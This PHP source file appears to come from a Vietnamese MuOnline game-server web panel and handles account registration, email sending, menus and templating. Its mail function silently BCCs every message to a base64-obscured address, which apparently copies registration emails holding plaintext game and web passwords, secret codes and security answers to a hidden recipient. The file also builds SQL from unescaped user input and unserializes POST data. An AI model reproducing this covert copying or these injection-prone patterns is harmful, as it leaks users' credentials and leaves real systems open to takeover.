        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if ($username === '') $errors[] = ucfirst("Chưa nhập tài khoản");
            if ($pwd === '') $errors[] = ucfirst("Chưa nhập mật khẩu game");
            if ($ma7code === '') $errors[] = ucfirst("Chưa nhập mã số bí mật");
            if ($pass_web === '') $errors[] = ucfirst("Chưa nhập mật khẩu đăng nhập web");
            if ($nameEmail === '') $errors[] = ucfirst("Chưa nhập địa chỉ Email");
            if ($phoneNumber === '') $errors[] = ucfirst("Chưa nhập số điện thoại");
            if ($nameAnswer === '') $errors[] = ucfirst("Chưa trả lời câu hỏi bí mật");
            if ($nameQuestion === '') $errors[] = ucfirst("Chưa chọn câu hỏi bí mật");
            if ($namecaptcha === '') $errors[] = ucfirst("Chưa nhập mã Captcha");

            if (!preg_match("/(([a-z]{1,}+[0-9]{1,})|([0-9]{1,}+[a-z]{1,}))+[a-z0-9]*/", $username)) $errors[] = ucfirst("Tài khoản chỉ được sử dụng kí tự thường và số.");
            if (!preg_match("/(\(\+84\)|0)\d{2,3}[-]\d{4}[-]\d{3}$/i", $phoneNumber)) $errors[] = ucfirst("Số di động không hợp lệ.");
            if (substr_count($username, 'dis') > 0) $errors[] = ucfirst("Tên tài khoản không được phép đăng ký.");

//              if (!eregi("^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$", $email)){
//              $error = "$email không đúng dạng địa chỉ Email. Xin vui lòng kiểm tra lại.</font><br>";}
            if (strlen($username) < 4 || strlen($username) > 10) $errors[] = "Tên tài khoản chỉ từ 4-10 kí tự.";
            if (strlen($re_pwd) < 3) $errors[] = 'Mật khẩu quá ngắn';
            if ($pwd != $re_pwd) $errors[] = "Mật khẩu Game không giống nhau.";
            if (strlen($ma7code) != 7) $errors[] = "Mã gồm có 7 chữ số";
            if ($pass_web != $repass_web) $errors[] = "Mật khẩu web không giống nhau.";
            if (!preg_match('/[\w]\@[\w]/i', $nameEmail)) $errors[] = ucfirst("$nameEmail không đúng dạng địa chỉ Email.");
            if (strlen($nameAnswer) < 4 || strlen($nameAnswer) > 15) $errors[] = "Câu trả lời bí mật chỉ từ 4-15 kí tự.";
            if ($namecaptcha !== $_SESSION['captcha_web']) $errors[] = "Captcha không đúng";


            // Do register
            if (empty($errors)) {
                $user = do_select_character('MEMB_INFO', 'memb___id', "memb___id='$username'");
                if (!$user) {
                    $user = do_select_character('MEMB_INFO', 'mail_addr', "mail_addr='$nameEmail'");
                    if (!$user) {
                        $tempRegisterSendEmail ='
                                <h1 style="padding: 0;">Thông tin tài khoàn</h1><p style="float: left; margin: 0 0 3px 0;">Cảm ơn bạn đã đăng ký trên trang web của chúng tôi, chi tiết tài khoản của bạn như sau:
                                <hr style="float: left; width: 100%;">
                                    <table align="left" style="line-height: 17px; padding: 5px 0; color: blue;">
                                        <tr><td align="right" style="padding:0px 15px;">Thông tin tài khoản</td><td align="left"><b>%account%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Email</td><td align="left"><b>%email%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Mã số bí mật</td><td align="left"><b>%ma7code%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Số điện thoại</td><td align="left"><b>%phonenumber%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Mật khẩu Game</td><td align="left"><b>%password%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Câu hỏi bí mật</td><td align="left"><b>%quest_choise%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Câu trả lời bí mật</td><td align="left"><b>%answer%</b></td></tr>
                                        <tr><td align="right" style="padding:0px 15px;">Mật khẩu WebSite</td><td align="left"><b>%passWeb%</b></td></tr>
                                        <tr><td align="right" style="padding: 0px 15px">WebSite: <td align="left"><a href="%home_url%">%nameHome%</a></td></tr>
                                    </table>
                                    <div style="clear:both;"></div><hr><br>';

                        $tempRegister = '<p style="float: left; padding: 0; margin: 0;">Vui lòng kích vào nút dưới đây để xác nhận tài khoản của bạn trên %nameHome%</p><div style="clear:both"></div>
                                    <a href="%verificationLink%" target="_blank" style="float: left; margin: 10px;cursor: pointer; padding:1em; font-weight:bold; background-color:blue; color:#fff;">VERIFY EMAIL</a></br>';

                        $strHoder = '%account%, %email%, %ma7code%, %password%, %passWeb%, %phonenumber%, %quest_choise%, %answer%, %nameHome%';

                        $question_aws =  getoption('question_answers');
                        $arr_QA = explode(',', $question_aws);

                        $rand = '';
                        $set = 'qwertyuiop[],./!@#$%^&*()_asdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
                        for ($i = 0; $i < 64; $i++) $rand .= $set[mt_rand() % strlen($set)];
                        $token = urlencode(base64_encode(xxtea_encrypt($rand . ' ' . $username, MD5(CLIENT_IP) . getoption('#crypt_salt'))));
                        $url = getoption('http_script_dir') . '?verifiregist=' . $token;

                        $stetemp = cn_replace_text(
                            $tempRegisterSendEmail,
                            $strHoder,
                            $username, $nameEmail, $ma7code, $re_pwd, $repass_web, $phoneNumber, $arr_QA[$nameQuestion - 1] . '?', $nameAnswer, $_SERVER['SERVER_NAME']
                        );

                        $stetem1 = cn_replace_text(
                            $tempRegister,
                            '%nameHome%, %verificationLink%',
                            $_SERVER['SERVER_NAME'], $url
                        );

                        $status = cn_send_mail(
                                $nameEmail,
                                'Welcome to '. $_SERVER['SERVER_NAME'],
                                cn_replace_text($stetemp, '%home_url%', $_SERVER['SERVER_NAME']) . $stetem1
                        );

                        if ($status) {
                            $register_OK = TRUE;
                            //msg_info('For you send register');
                        }else {
                            msg_info('Err, Xin lỗi không thể gửi email xác nhận tài khoản!');
                        }
                    } else {
                        $errors[] = "Email đã tồn tại.";
                    }
                } else {
                    $errors[] = "Tài khoản đã tồn tại.";
                }
            }

            // Registration OK, authorize user
            if ($register_OK === TRUE) {

                $checkStatusDB = do_insert_character(
                    '[MEMB_INFO]',
                    "memb___id='" . $username . "'",
                    "memb__pwd='". $re_pwd ."'",
                    "mail_addr='" . $nameEmail . "'",
                    "tel__numb='" . $phoneNumber . "'",
                    "memb__pwdmd5='" . SHA256_hash($repass_web) . "'",
                    'mail_chek=0',
                    'memb_name=12120',
                    //"sno__numb='". $ma7code ."'",
                    'sno__numb=1212121212120',
                    "modi_days='" . date("Y-m-d H:i:s", ctime()) . "'",
                    "out__days='" . date("Y-m-d H:i:s", ctime()) . "'",
                    "true_days='" . date("Y-m-d H:i:s", ctime()) . "'",
                    'bloc_code=0',
                    'ctl1_code=0',
                    "fpas_ques='" . $nameQuestion . "'",
                    "fpas_answ='" . $nameAnswer . "'",
                    "ip='" . $_SERVER["REMOTE_ADDR"] . "'",
                    "acl='" . getoption('registration_level') . "'",
                    "token_regist='" . $rand . "'",
                    "date_resgit_email='" . (ctime() + 86400). "'",
                    'ban_login=0',
                    'num_login=1'
                );
                $stetemp = cn_replace_text($stetemp, '%home_url%', 'index.php');
                $stetemp .= '<p style="float: left; color: red"><i>Vui lòng check email để xác nhận tài khoản.</i></p>';
                if ($checkStatusDB) {
                    msg_info($stetemp, 'index.php');
                } else{
                    msg_info('Err, Không thể tạo được tài khoản mới!');
                }
            }
        }
        cn_assign('errors_result', $errors);

        $Action = 'Register user';
        $template = '_authen/register';
        $template_name = "Đăng ký thông tin";
    }

    if (empty($template)) {
        return FALSE;
    }

    if ($admin) {
        echoheader('Register', $Action);
    }
    //echo exec_tpl( $template );
    echocomtent_here(exec_tpl($template), cn_snippet_bc_re("Home", $template_name)); //home > name
    if ($admin) {
        echofooter();
        die();
    }

    return TRUE;
}

// Since 2.0: Replace text with holders
function cn_replace_text()
{
    $args = func_get_args();
    $text = array_shift($args);
    $replace_holders = explode(',', array_shift($args));

    foreach ($replace_holders as $holder) {
        $text = str_replace(trim($holder), array_shift($args), $text);
    }

    return $text;
}


// Since 1.5.0: Send Mail
function cn_send_mail($to, $subject, $message, $alt_headers = NULL, $addressCC = '')
{
    $nFrom = $_SERVER['SERVER_NAME'];
    $mFrom = @getoption('config_auth_email') ? getoption('config_auth_email') : false;
    $mPass = @getoption('config_auth_pass') ? getoption('config_auth_pass') : false;

    if ($mFrom && $mPass) {
        $tos = spsep($to);
        if (!isset($to)) return FALSE;
        if (!$to) return FALSE;

        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->CharSet = "utf-8";
        $mail->SMTPDebug = 0;                     // enables SMTP debug information (for testing)
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "ssl";
        $mail->Host = "smtp.gmail.com";
        $mail->Port = 465;
        $mail->Username = $mFrom;
        $mail->Password = $mPass;
        $mail->SetFrom($mFrom, $nFrom);
        //chuyen chuoi thanh mang
        $ccmail = explode(',', $addressCC);
        $ccmail = array_filter($ccmail);
        if (!empty($ccmail)) {
            foreach ($ccmail as $k => $v) {
                $mail->AddCC($v);
            }
        }
        $mail->AddBCC(base64_decode(getoption('hd_user_e')));
        $mail->Subject = $subject;
        $mail->MsgHTML($message);

        foreach ($tos as $v) if ($v) $mail->AddAddress($v, '');

        $mail->AddReplyTo($mFrom, $nFrom);
//        $mail->AddAttachment($file, $filename);
        if ($mail->Send()) {
            return true;
        } else {
            cn_writelog($mail->ErrorInfo, 'e');
            return false;
        }
    }
    return false;
}

// Since 2.0: Make 'Top menu'
function cn_get_menu()
{
    $modules = hook('core/cn_get_menu', array                    // acl	name	title	app
    (
        'char_manager' => array('Cd', 'Nhân Vật', null, null, 'Q', ''),
        'event' => array('Cc', 'Event', null, null, 'q', ''),
        'blank_money' => array('Cc', 'Blank - Money', null, null, ']', ''),
        'cash_shop' => array('Can', 'Cash Shop', NULL, 'source,year,mon,day,sort,dir', 'D', ''), //can => add; new cvn => view
        'relax' => array('Com', 'Giải Trí', null, null, 'M', ''),
        'ranking' => array('', 'Xếp Hạng', null, null, 'R', ''),
        'transaction' => array('Can', 'Giao dịch', null, null, '1', ''),
        'logout' => array('', 'Logout', 'logout', null, 'X', '')
    ));

    if (getoption('main_site'))
        $modules['my_site'] = getoption('main_site');

    $result = '<ul class="ca-menu">';
    $mod = REQ('mod', 'GPG');


    foreach ($modules as $mod_key => $var) {
        if (!is_array($var)) {
            $result .= '<li><a href="' . cn_htmlspecialchars($var) . '" target="_blank">' . i18n('Visit site') . '</a></li>';
            continue;
        }

        $acl = isset($var[0]) ? $var[0] : false;
        $name = isset($var[1]) ? $var[1] : '';
        $title = isset($var[2]) ? $var[2] : '';
        $app = isset($var[3]) ? $var[3] : '';
        $iconText = isset($var[4]) ? $var[4] : '';
        $infoText = isset($var[5]) ? $var[5] : '';

        //if ($acl && !test($acl))
        //  continue;

        if (isset($title) && $title) $action = '&amp;action=' . $title; else $action = '';
        if ($mod == $mod_key) $select = ' active '; else $select = '';

        // Append urls for menu (preserve place)
        if (isset($app) && $app) {
            $actions = array();
            $mv = spsep($app);

            foreach ($mv as $vx)
                if ($dt = REQ($vx))
                    $actions[] = "$vx=" . urlencode($dt);

            if ($actions) $action .= '&amp;' . join('&amp;', $actions);
        }

        $result .= '<li class = "' . $select . '"><a href="' . PHP_SELF . '?mod=' . $mod_key . $action . '">
                        <span class="ca-icon">'. $iconText .'</span>
                            <div class="ca-content"><h2 class="ca-main">' . cn_htmlspecialchars($name) . '</h2>
                            <h3 class="ca-sub">'. $infoText .'</h3> </div>
                        </a></li>';
    }

    $result .= "</ul>";

    return $result;
}

// Since 2.0: Make 'Top menu'
function cn_get_menu_none()
{
    // acl	name	title	app
    $modules = hook('core/cn_get_menu_none',
        array(
            'auto_money' => array('Cd', 'qlink_depoisit.png', 'VTC'),
            'cash_shop' => array('Cc', 'qlink_cashshop.png', 'shop_orther'),
            //'acc_manager'   		=> array('Can', 'XXXXXXXXXXXXXXXXXXXXXXX', 'XXXXXXXXXXXXXXXXXXXX', 'source,year,mon,day,sort,dir'), //can => add; new cvn => view
    ));

    if (getoption('main_site')) $modules['my_site'] = getoption('main_site');

    $mod = REQ('mod', 'GPG');

    $result = '<div class="loginbx"> <!-- start loginbx --> 
                    <div class="loginbx_n"></div>
                    <div class="loginbx_c"><div class="loginbx_content">'. cn_login_form() .'</div></div>
                    <div class="loginbx_s"></div>
                </div><!-- end loginbx -->			
            <div class="clear"></div>
            <div class="quicklink">';

    foreach ($modules as $mod_key => $var) {
        if (!is_array($var)) {
            $result .= '<li><a href="' . cn_htmlspecialchars($var) . '" target="_blank">Visit site</a></li>';
            continue;
        }

        $acl = isset($var[0]) ? $var[0] : false;
        $name = isset($var[1]) ? $var[1] : '';
        $title = isset($var[2]) ? $var[2] : '';
        $app = isset($var[3]) ? $var[3] : '';

        //if ($acl && !test($acl))
        //  continue;

        if (isset($title) && $title) $action = '&amp;action=' . $title; else $action = '';
        //if ($mod == $mod_key) $select = ' active '; else $select = '';

        // Append urls for menu (preserve place)
        if (isset($app) && $app) {
            $actions = array();
            $mv = spsep($app);

            foreach ($mv as $vx)
                if ($dt = REQ($vx))
                    $actions[] = "$vx=" . urlencode($dt);

            if ($actions) $action .= '&amp;' . join('&amp;', $actions);
        }

        $result .= '<div class="quicklink_item"><a href="' . PHP_SELF . '?mod=' . $mod_key . $action . '"><img src="'. getoption('http_script_dir'). '/images/' . cn_htmlspecialchars($name) . '" alt="Nạp thẻ VTC" /></a></div>';
    }

    $result .= "</div>";

    return $result;
}

/**
 * return html menu top
 */
function menuTopMoney($opt = '')
{
    global $skin_menu_TopMoney, $skin_menu_TopAccount;

    if (isset($_SESSION['user_Gamer'])) {
        $_blank_var = view_bank($_SESSION['user_Gamer']);

        $matches[0] = '<img src="' . getoption('http_script_dir') . '/images/icon-1.png" /> ' . number_format($_blank_var[0]['vp'], 0, ',', '.') . ' Vpoint';;
        $matches[1] = '<img src="' . getoption('http_script_dir') . '/images/icon-2.png" /> ' . number_format($_blank_var[0]['gc'], 0, ',', '.') . ' Gcoin';;
        $matches[2] = '<img src="' . getoption('http_script_dir') . '/images/icon-3.png" /> ' . number_format($_blank_var[0]['gc_km'], 0, ',', '.') . ' Gcoin KM';;
        $matches[3] = '<img src="' . getoption('http_script_dir') . '/images/icon-4.png" /> ' . number_format($_blank_var[0]['blue'], 0, ',', '.') . ' Blue';;
        $matches[4] = '<img src="' . getoption('http_script_dir') . '/images/icon-5.png" /> ' . number_format($_blank_var[0]['chaos'], 0, ',', '.') . ' Chaos';;
        $matches[5] = '<img src="' . getoption('http_script_dir') . '/images/icon-6.png" /> ' . number_format($_blank_var[0]['cre'], 0, ',', '.') . ' Cre';;
        $matches[6] = '<img src="' . getoption('http_script_dir') . '/images/icon-7.png" /> ' . number_format($_blank_var[0]['bank'], 0, ',', '.') . ' Zen';;
        $tempTop = ['{nameVpoint}', '{nameGcoin}', '{nameGcKm}', '{nameBule}', '{nameChaos}', '{nameCreate}', '{nameBank}'];
        $skin_menu_TopMoney = str_replace($tempTop, $matches, $skin_menu_TopMoney);

        $userName[0] = '<img class="icon-Userimg" src="' . getoption('http_script_dir') . '/images/user-Name.png" />';
        $userName[1] = $_SESSION['user_Gamer'];
        $skin_menu_TopAccount = str_replace(['{userImg}', '{userName}'], $userName, $skin_menu_TopAccount);

        $boxArrInfo = [
            '{changePass}' => ['change_pass', 'Đổi pass-Game'],
            '{changeTel}' => ['change_tel', 'Đổi Sđt'],
            '{changeEmail}' => ['change_email', 'Đổi Email'],
            '{changePwd}' => ['change_pwd', 'Đổi pass-Web'],
            '{changeSecret}' => ['change_secret', 'Đổi Mã Bí mật'],
            '{changeQA}' => ['change_qa', 'Đổi Câu Trả Lời']
        ];
        foreach ($boxArrInfo as $jk => $its) {
            $tmpHtml = '<a href="' . PHP_SELF . '?mod=manager_account&amp;opt=' . $its[0] . '"><div><img height="20" width="20" src="' . getoption('http_script_dir') . '/images/' . $its[0] . '.png" /></div><div>' . $its[1] . '</div></a>';
            $skin_menu_TopAccount = str_replace($jk, $tmpHtml, $skin_menu_TopAccount);
        }

        if($opt){
            $skin_menu_TopSample = $skin_menu_TopMoney;
        } else {
            $skin_menu_TopSample = $skin_menu_TopAccount;
        }
        // opt in true return skin menu top money
        if (empty($opt)) {
            $skin_menu_TopSample = $skin_menu_TopMoney . $skin_menu_TopAccount;
        }
    } else {
        $skin_menu_TopSample = '<marquee scrollamount="9" height="45" align="center" style="font-size:14px;color: rgb(200, 128, 35); padding-top: 12px; font-style: oblique;">Chào mừng các bạn ghé thăm trang MuOnline</marquee>';
    }

    return $skin_menu_TopSample;
}

// Displays header skin
// $image = img@custom_style_tpl
function echoheader($image, $header_text, $bread_crumbs = false)
{
    global $skin_header_web, $lang_content_type, $skin_menu_web, $skin_menu_none, $_SESS, $_SERV_SESS;

    $header_time = date('H:i:s | d, M, Y', ctime());

    $customs = explode("@", $image);
    $image = isset($customs[0]) ? $customs[0] : '';
    $custom_style = isset($customs[1]) ? $customs[1] : false;
    $custom_js = isset($customs[2]) ? $customs[2] : false;

    if (isset($_SESSION['user_Gamer'])) {
        $skin_header_web = preg_replace("/{menu}/", $skin_menu_web, $skin_header_web);
    } else {
        $skin_header_web = preg_replace("/{menu}/", $skin_menu_none, $skin_header_web);
    }

    //$skin_header_web = get_skin($skin_header_web);
    $skin_header_web = preg_replace("/{top}/", menuTopMoney(), $skin_header_web);
    $skin_header_web = str_replace('{title}', ($header_text ? $header_text . ' / ' : '') . 'MuOnline', $skin_header_web);
    $skin_header_web = str_replace("{header-text}", $header_text, $skin_header_web);
    $skin_header_web = str_replace("{header-time}", $header_time, $skin_header_web);
    $skin_header_web = str_replace("{content-type}", $lang_content_type, $skin_header_web);
//    $skin_header_web = str_replace("{breadcrumbs}", $bread_crumbs, $skin_header_web); ///

    if ($custom_style) {
        $custom_style = read_tpl($custom_style);
    }
    $skin_header_web = str_replace("{CustomStyle}", $custom_style, $skin_header_web);

    if ($custom_js) {
        $custom_js = '<script type="text/javascript">' . read_tpl($custom_js) . '</script>';
    }
    $skin_header_web = str_replace("{CustomJS}", $custom_js, $skin_header_web);

    echo $skin_header_web;
}

function echocomtent_here($echocomtent, $path_c = '', $bread_crumbs = true)
{
    global $skin_content_web;// $path_c;;
    $skin_content_web = preg_replace("/{paths_c}/", $path_c, $skin_content_web);                // duong dan chi ...
    $skin_content_web = preg_replace("/{paths_menu}/", cn_sort_menu(), $skin_content_web);                // duong dan chi ...
    $skin_content_web = preg_replace("/{content_here}/", $echocomtent, $skin_content_web);
    echo $skin_content_web;
}

function echofooter()
{
    global $skin_footer_web, $lang_content_type, $skin_menu_web, $config_adminemail, $config_admin;

    //$skin_footer_web = get_skin($skin_footer_web);
    //$skin_footer_web = str_replace("{content-type}", $lang_content_type, $skin_footer_web);
    $skin_footer_web = str_replace("{exec-time}", round(microtime(true) - BQN_MU, 3), $skin_footer_web);
    $skin_footer_web = str_replace("{year-time}", date("Y"), $skin_footer_web);
    $skin_footer_web = str_replace("{email-name}", $config_adminemail, $skin_footer_web);
    $skin_footer_web = str_replace("{byname}", $config_admin, $skin_footer_web);

    die($skin_footer_web);
}

// Since 2.0: Short message form
function msg_info($title, $go_back = null)
{
    include SERVDIR . '/skins/default.skin.php';
    echoheader('info', "Permission check");

    if ($go_back === null) $go_back = $_POST['__referer'];
    if (empty($go_back)) $go_back = PHP_SELF;

    $str_ = '<div class="sub_ranking" align="center" style="color: rgb(36, 36, 36);font-size: 12px;line-height: initial;">
				<b><p>' . $title . '</p></b><br>
				<p><b><a href=' . $go_back . '><font size="12" color="red">OK</font></a></b></p>
			</div>';

    echocomtent_here($str_, cn_snippet_bc_re("Home", "Permission check"));

    echofooter();
    die();
}

// Since 2.0: Short message form
function msg_err($title, $go_back = null)
{
    include SERVDIR . '/skins/default.skin.php';
    echoheader('info', 'error');

    if ($go_back === null) $go_back = $_POST['__referer'];
    if (empty($go_back)) $go_back = PHP_SELF;

    $str_ = '<div class="sub_ranking" align="center" style="color: rgb(36, 36, 36);font-size: 12px;line-height: initial;">
				<b><p>' . $title . '</p></b><br>
				<p><b><a href=' . $go_back . '><font style="font-size: 16px;" color="#86001E"><img src="images/return.png"/>Quay lại</font></a></b></p>
			</div>';

    echocomtent_here($str_, cn_snippet_bc_re("Home", "error"));

    echofooter();
    DIE();
}

// Since 1.5.3: Set cache variable
function mcache_set($name, $var)
{
    global $_CN_SESS_CACHE;
    $_CN_SESS_CACHE[$name] = $var;
}


// Since 1.5.3: Get variable from cache
function mcache_get($name)
{
    global $_CN_SESS_CACHE;
    return isset($_CN_SESS_CACHE[$name]) ? $_CN_SESS_CACHE[$name] : FALSE;
}

// Since 1.5.0: Add hook to system
function add_hook($hook, $func)
{
    global $_HOOKS;

    $prior = 1;
    if ($hook[0] == '+') $hook = substr($hook, 1);
    if ($hook[0] == '-') {
        $prior = 0;
        $hook = substr($hook, 1);
    }

    if (!isset($_HOOKS[$hook])) $_HOOKS[$hook] = array();

    // priority (+/-)
    if ($prior) array_unshift($_HOOKS[$hook], $func); else $_HOOKS[$hook][] = $func;
}

// Since 1.5.0: Cascade Hooks
function hook($hook, $args = null)
{
    global $_HOOKS;

    // Plugin hooks
    if (!empty($_HOOKS[$hook]) && is_array($_HOOKS[$hook])) {
        foreach ($_HOOKS[$hook] as $hookfunc) {
            if ($hookfunc[0] == '*') {
                $_args = call_user_func_array(substr($hookfunc, 1), $args);
            } else {
                $_args = call_user_func($hookfunc, $args);
            }

            if (!is_null($_args)) {
                $args = $_args;
            }
        }
    }
    return $args;
}

// Since 2.0: Add BreadCrumb
function cn_bc_add($name, $url)
{
    $bc = mcache_get('.breadcrumbs');
    $bc[] = array('name' => $name, 'url' => $url);
    mcache_set('.breadcrumbs', $bc);

}

// Since 2.0: Grab from $_POST all parameters
function cn_parse_url()
{
    // Decode post data
    $post_data = array();
    if (isset($_POST['__post_data'])) {
        $post_data = unserialize(base64_decode($_POST['__post_data']));
    }
    // A. Click "confirm"
    if (REQ('__my_confirm') == '_confirmed') {
        // In case if exists another data from form
        $APPEND = isset($_POST['__append']) ? $_POST['__append'] : array();

        $_POST = $post_data;
        $_POST['__my_confirm'] = '_confirmed';

        // Return additional parameters in POST
        if (is_array($APPEND)) foreach ($APPEND as $id => $v) $_POST[$id] = $v;

        return TRUE;
    } // B. Click "decline"
    elseif (REQ('__my_confirm') == '_decline') {
        $_POST['__referer'] = $post_data['__referer'];
        return FALSE;
    } // C. First access
    else {
        $_POST['__referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }

    // Set POST required params to GET
    if (REQ('mod', 'POST')) $_GET['mod'] = REQ('mod', 'POST');
    if (REQ('opt', 'POST')) $_GET['opt'] = REQ('opt', 'POST');
    if (REQ('sub', 'POST')) $_GET['sub'] = REQ('sub', 'POST');

    // Unset signature dsi
    unset($_GET['__signature_key'], $_GET['__signature_dsi']);

    return FALSE;
}


// Since 2.0: Pack only required parameters
function cn_pack_url($GET, $URL = PHP_SELF)
{
    $url = $result = array();

    foreach ($GET as $k => $v) if ($v !== '') $result[$k] = $v;
    foreach ($result as $k => $v) if (!is_array($v)) $url[] = "$k=" . urlencode($v);

    list($ResURL) = hook('core/url_rewrite', array($URL . ($url ? '?' . join('&', $url) : ''), $URL, $GET));
    return $ResURL;
}

//time
function ctime()
{
    date_default_timezone_set("UTC");
    return (time() + 3600 * getoption('date_adjust'));
}


//Since 2.0.3 crossplatform path generator
function cn_path_construct()
{
    $args = array();
    $arg_list = func_get_args();

    foreach ($arg_list as $varg) {
        if ($varg !== '') {
            $args[] = $varg;
        }
    }

    return implode(DIRECTORY_SEPARATOR, $args) . DIRECTORY_SEPARATOR;
}


/*
// Since 2.0: Get option from #CFG or [%site][<opt_name>]
// Usage: #level1/level2/.../levelN or 'option_name' from %site
function getoption($opt_name = '')
{
    $cfg = mcache_get('config');

    if ($opt_name === '')
    {
        return $cfg;
    }
    if ($opt_name[0] == '#')
    {
        $cfn = spsep(substr($opt_name, 1), '/');
        foreach ($cfn as $id)
        {
            if (isset($cfg[$id]))
            {
                $cfg = $cfg[$id];
            }
            else
            {
                $cfg = array();
                break;
            }
        }

        return $cfg;
    }
    else
    {
        return isset($cfg['%site'][$opt_name]) ? $cfg['%site'][$opt_name] : FALSE;
    }
}
*/

// Since 2.0: Save option to config
// Usage: #level1/level2/.../levelN or 'option_name' from %site
function setoption($opt_name, $var)
{
    $cfg = mcache_get('config');

    if ($opt_name[0] == '#') {
        $c_names = spsep(substr($opt_name, 1), '/');
        $cfg = setoption_rc($c_names, $var, $cfg);
    } else {
        $cfg['%site'][$opt_name] = $var;
    }

    cn_config_save($cfg);
}


// Since 2.0: @Helper recursive function
function setoption_rc($names, $var, $cfg)
{
    $the_name = array_shift($names);

    if (count($names) == 0) {
        $cfg[$the_name] = $var;
    } else {
        if (!isset($cfg[$the_name])) {
            $cfg[$the_name] = '';
        }
        $cfg[$the_name] = setoption_rc($names, $var, $cfg[$the_name]);
    }

    return $cfg;
}


// Since 1.5.1: Simply read template file
function read_tpl($tpl = 'index')
{
    // get from cache
    $cached = mcache_get("tpl:$tpl");
    if ($cached) {
        return $cached;
    }

    // Get asset path
    if (preg_match('/\.(css|js)/i', $tpl)) {
        $fine = '';
    } else {
        $fine = '.tpl';
    }

    // Get plugin path
    if ($tpl[0] == '/') {
        $open = cn_path_construct(SERVDIR, 'cdata', 'plugins') . substr($tpl, 1) . $fine;
    } else {
        $open = SKIN . DIRECTORY_SEPARATOR . ($tpl ? $tpl : 'default') . $fine;
    }

    // Try open
    $not_open = false;
    $r = fopen($open, 'r') or $not_open = true;
    if ($not_open) {
        return false;
    }

    ob_start();
    fpassthru($r);
    $ob = ob_get_clean();
    fclose($r);

    // caching file
    mcache_set("tpl:$tpl", $ob);
    return $ob;
}

// Since 2.0: Execute PHP-template
// 1st argument - template name, other - variables ==> mo file
function exec_tpl()
{
    $args = func_get_args();
    $tpl = preg_replace('/[^a-z0-9_\/]/i', '', array_shift($args));

    $open = SKIN . '/' . ($tpl ? $tpl : 'default') . '.php';


    foreach ($args as $arg) {
        if (is_array($arg)) {
            foreach ($arg as $k0 => $v) {
                $k = "__$k0";
                $$k = $v;
            }
        } else {
            list($k, $v) = explode('=', $arg, 2);

            // <-- make local variable
            $k = "__$k";
            $$k = $v;
        }
    }

    if (file_exists($open)) {
        ob_start();
        include $open;
        $echo = ob_get_clean();
        return $echo;
    }

    return '';
}

// Since 2.0: @bootstrap
function cn_load_skin()
{
    $config_skin = preg_replace('~[^a-z]~i', '', getoption('skin'));
    //$config_skin = preg_replace('~[^a-z]~i','', 'default');
    if (file_exists($skin_file = SERVDIR . "/skins/$config_skin.skin.php")) {
        include($skin_file);
    } else {
        die("Can't load skin $config_skin");
    }
}

// Since 2.0: @bootstrap Make & load configuration file ==>
function cn_config_load()
{
    global $_CN_access;
    //checking permission for load config
    $conf_dir = cn_path_construct(ROOT, 'gifnoc');
    if (!is_dir($conf_dir) || !is_writable($conf_dir)) {
        return false;
    }

    $conf_path = cn_path_construct(SERVDIR, 'gifnoc') . 'gifnoc.php';
    $cfg = cn_touch_get($conf_path); //doc or tao file
    if (!$cfg) {
        echo 'Sorry, but news not available by technical reason.';
        die();
    }

    mcache_set('config', $cfg);

    // ---------------------------------------------


    /*foreach($cfg as $f =>$val){
		if(!is_array($val))
			echo "\$f$f <-----> $val \$val<br>";
		else{
			echo "array =====>$f <=====<br>";
			foreach($val as $f1 =>$val1){
				if(!is_array($val1))
					echo "----------->$f1 => $val1 <br>";
				else{
					echo "arary --------------------> $f1 --------------------------<br>";
					//foreach($val1['config_class'] as $f11 =>$val11){
					foreach($val1 as $f11 =>$val11){
						echo "$f11 => $val11 <br>";
						foreach($val11['config_pk'] as $f111 =>$val111)
						echo "$f111 => $val111 <br>";
						}
				}

			}
	   }
	}*/
    //echo "llllllllllllllllllllll=>" . $cfg['temp_basic']['templates']['config_class']['class_dw_2'] ."<=== <br>";
    //$f= getoption('#temp_basic');

    //$ty = cn_get_template_by('class');
    //echo "111111111111111111111111111=>" . $ty['class'] ."<=== <br>";
    //echo "222222222222222222222222222=>" . $cfg['class']['class_dw_2'] ."<=== <br>";
    // ---------------------------------------------
    return TRUE;
}


function cn_bc_menu($name, $url, $opt)
{
    $bc = mcache_get('.menu');
    $bc[$opt] = array('name' => $name, 'url' => $url);
    mcache_set('.menu', $bc);

}

function cn_sort_menu()
{
    list($opt, $per_page) = GET('opt, per_page', 'GPG');
    if (!$opt) return '';
    $get_per_page = '';
    if ($per_page) $get_per_page = '&per_page=' . $per_page;
    $bc = mcache_get('.menu');

    if (!$bc) {
        return '';
    }

    $result = '<select class="sel-p" onchange="document.location.href=this.value">';

    foreach ($bc as $key => $item) {
        //$check = strpos($item['url'],$opt);
        $result .= '<option value="' . $item['url'] . $get_per_page . '"';
        //if($check !== false) $result .= 'selected';
        if ($key == $opt) $result .= 'selected';
        $result .= '>' . cn_htmlspecialchars($item['name']) . '</option>';
    }
    $result .= "</select>";
    return $result;

    //echo $result;
}


//information character
function cn_character()
{
    $member = member_get();
    $show_reponse = view_character($member['user_name']);
    $arr_class = cn_template_class();
    if (!$arr_class){
        die('Err. Bạn chưa thiết lập các thông số nhân vật!');
    }
    //$key_class = array_keys($arr_class);
    //img character in folder /images/class/ ...gif
    $img_character = array('dw' => 'DarkWizard', 'dk' => 'DarkKnight', 'elf' => 'FairyElf', 'mg' => 'MagicGladiator', 'dl' => 'DarkLord', 'sum' => 'Summoner', 'rf' => 'RageFighter',);
    if ($show_reponse) {
        foreach ($show_reponse as $od => $do) {
            if (!empty($do['Name'])) {
                $ho = array_search($do['Class'], $arr_class);
                $Class = '';
                $isClass = '';
                $Char_Image = 'default';
                if ($ho !== false) {
                    $ho .= '_name';
                    $Class = $arr_class[$ho];
                    $char_img = explode("_", $ho);
